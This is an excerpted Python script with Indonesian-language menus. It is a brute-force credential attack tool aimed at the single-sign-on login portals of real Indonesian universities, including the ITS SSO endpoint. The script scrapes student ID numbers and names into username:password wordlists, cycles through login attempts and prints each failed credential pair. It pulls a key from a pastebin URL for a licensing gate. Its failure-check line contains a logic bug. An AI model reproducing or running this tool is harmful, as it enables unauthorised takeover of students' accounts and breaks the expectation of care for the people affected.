...
def lg():
  ...
  print(f'•    {C}04{NC}){G}UAD{NC}  {C}09{NC}){G}ITB{NC}  {C}14{NC}){G}UNHAS{NC}  {C}19{NC}){G}UNSYIAH{NC}')
...
try:
  ...
  try:
    ...
    exp = '32-12-9999 | 00:00 PM'
    linkey = req.get('https://pastebin.com/raw/q58WcDvm', verify=False).text
    keys = 'kewek'
    def logins():
      handlew = open('.keys', 'w')
    ...
    def loginf():
      ...
      print(f'{NC} • {DW}=> {DY}Chat Link Diatas{DW}..!!{NC}')
      sleep(2)
      kunci()
    def kunci():
      try:
        ...
        lg()
        print(f'{NC} • {DG}Chat {DW}| {DY}{linkey}{NC}')
          ...
          if len(data) > 0:
            try:
              ...
              prams = {
                ...
                'redirect_uri': 'https://my.its.ac.id/sso/auth', 
        ...
        for line in lines:
          ...
          if len(data) > 0:
            try:
              ...
              if anuin.text == 'Gagal Login! Password salah.' or 'Gagal Login! Data pengguna tidak ditemukan.':
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
      ...
      if expired >= exp:
        ...
        try:
          ...
          if Pilih_MainMenu == '':
            ...
            print(f'•    {C}7{NC}) GRAB {G}NIM{NC}:{G}(i)nama(i){NC}      {C}17{NC}) GRAB {G}nama(i){NC}:{G}Nama(i){NC}')
            print(f'•    {C}8{NC}) GRAB {G}NIM{NC}:{G}(i)Nama(i){NC}      {C}18{NC}) GRAB {G}nama{NC}:{G}(i){NC}')
            print(f'•    {C}9{NC}) GRAB {G}NIM{NC}:{G}namanama(i){NC}     {C}19{NC}) GRAB {G}NIM{NC}:{G}ALL_in_1{NC}')
            print(f'•    {C}10{NC}) GRAB {G}NIM{NC}:{G}Namanama(i){NC}    {R}0{NC}) {Y}Kembali{NC}')
            print(f'•    {R}x{NC}) {R}Keluar{NC}')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BR}BruteForce{NC}')
            ...
            if Pilih_MenuGrab == '':
              ...
              if apa == '':
                ...
                for _ in range(len(dapat)):
                  ...
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+cuk1+_nama_[0].lower()+cuk2+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
              ...
              if apa == '':
                ...
                for _ in range(len(dapat)):
                  ...
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+cuk1+_nama_[0].title()+cuk2+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
